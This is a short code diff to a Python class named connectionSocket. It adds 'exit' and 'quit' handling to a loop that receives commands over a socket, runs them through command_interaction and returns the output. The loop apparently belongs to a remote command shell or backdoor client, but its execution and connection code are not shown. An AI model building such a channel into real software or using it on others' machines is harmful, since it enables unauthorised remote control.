@@ -29,6 +29,15 @@ class connectionSocket:
     def listening(self):
         while True:
             command = self.json_recv()
+
+            if command[0] == "exit":
+                self.connection.close()
+                exit()
+
+            if command[0] == "quit":
+                self.connection.close()
+                exit()
+
             command_output = self.command_interaction(command)
             self.json_send(command_output)
         self.connection.close()
